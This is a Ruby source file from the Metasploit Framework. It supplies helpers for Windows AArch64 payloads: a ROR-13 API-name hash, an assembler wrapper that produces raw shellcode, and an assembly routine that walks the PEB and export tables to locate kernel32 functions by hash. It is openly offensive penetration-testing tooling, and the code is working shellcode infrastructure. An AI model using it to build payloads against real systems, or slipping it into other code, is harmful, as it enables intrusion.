# -*- coding: binary -*-

module Msf
  # Shared helpers for Windows ARCH_AArch64 payloads (PEB/EAT ROR-13
  # hashing and the aarch64 gem assembler glue).
  module Payload::Windows::Aarch64
    #
    # ROR-13 hash of a kernel32/ws2_32 export name, matching the asm
    # find_function routine (stops on CBZ before adding the NUL).
    #
    # @param str [String] export name without trailing NUL
    # @return [Integer] 32-bit hash
    #
    def ror13_hash(str)
      h = 0
      str.each_byte do |b|
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + b) & 0xFFFFFFFF
      end
      h
    end

    #
    # Assemble an AArch64 asm string to raw bytes via the aarch64 gem.
    #
    # @param asm_string [String]
    # @return [String] raw shellcode
    #
    def compile_aarch64(asm_string)
      require 'aarch64/parser'
      parser = ::AArch64::Parser.new
      asm = parser.parse(without_inline_comments(asm_string))
      asm.to_binary
    end

    #
    # Strip `//` comments and blank lines so the aarch64 gem parser is happy.
    #
    # @param string [String]
    # @return [String]
    #
    def without_inline_comments(string)
      string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
    end

    #
    # PEB walk + Stephen Fewer ROR-13 Export Address Table resolver.
    #
    # On entry, sets up nothing beyond requiring a frame at +x29+. On exit via
    # +find_function_ret+, stores +&find_function+ at +[x29, #0x08]+ and
    # branches to the caller-provided +resolve_symbols_kernel32+ label with
    # kernel32 base in +x3+. Callers invoke resolved APIs with:
    #   ldr x9, [x29, #0x08] ; blr x9  (hash in w0, module base in x3).
    #
    # @return [String] assembly from +find_kernel32:+ through +find_function_finished:+
    #
    def asm_block_api_aarch64
      <<~ASM
        find_kernel32:
          ldr     x6, [x18, #0x60]
          ldr     x6, [x6,  #0x18]
          ldr     x6, [x6,  #0x30]
        next_module:
          ldr     x3, [x6, #0x10]
          ldr     x7, [x6, #0x40]
          ldr     x6, [x6]
          ldrh    w8, [x7, #24]
          cbnz    w8, next_module
        find_function_shorten:
          b       find_function_shorten_bnc
        find_function_ret:
          str     x30, [x29, #0x08]
          b       resolve_symbols_kernel32
        find_function_shorten_bnc:
          bl      find_function_ret
        find_function:
          mov     w10, w0
          ldr     w8,  [x3, #0x3c]
          add     x8,  x8, x3
          ldr     w9,  [x8, #0x88]
          add     x9,  x9, x3
          ldr     w4,  [x9, #0x18]
          ldr     w11, [x9, #0x20]
          add     x11, x11, x3
        find_function_loop:
          cbz     w4, find_function_finished
          sub     w4, w4, #1
          mov     w15, w4
          lsl     x15, x15, #2
          add     x15, x11, x15
          ldr     w12, [x15]
          add     x6,  x12, x3
        compute_hash:
          mov     w5, wzr
        compute_hash_again:
          ldrb    w0, [x6], #1
          cbz     w0, compute_hash_finished
          ror     w5, w5, #13
          add     w5, w5, w0
          b       compute_hash_again
        compute_hash_finished:
        find_function_compare:
          cmp     w5, w10
          b.ne    find_function_loop
          ldr     w12, [x9, #0x24]
          add     x12, x12, x3
          mov     w15, w4
          lsl     x15, x15, #1
          add     x15, x12, x15
          ldrh    w4,  [x15]
          ldr     w12, [x9, #0x1c]
          add     x12, x12, x3
          mov     w15, w4
          lsl     x15, x15, #2
          add     x15, x12, x15
          ldr     w13, [x15]
          add     x0,  x13, x3
        find_function_finished:
          ret
      ASM
    end
  end
end
